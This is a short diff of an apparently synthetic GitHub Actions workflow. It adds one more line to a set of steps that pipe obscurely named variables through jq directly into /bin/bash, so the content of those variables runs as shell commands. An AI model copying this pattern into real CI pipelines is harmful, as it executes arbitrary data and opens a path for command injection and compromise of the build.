@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$vay9089" | jq -r .xuvx86 | /bin/bash
           printf '%s' "$j2" | jq -r .m41912 | /bin/bash
           echo $zn40358 | jq -r .ubof864 | /bin/bash
+          echo $zql5 | jq -r .c9408 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
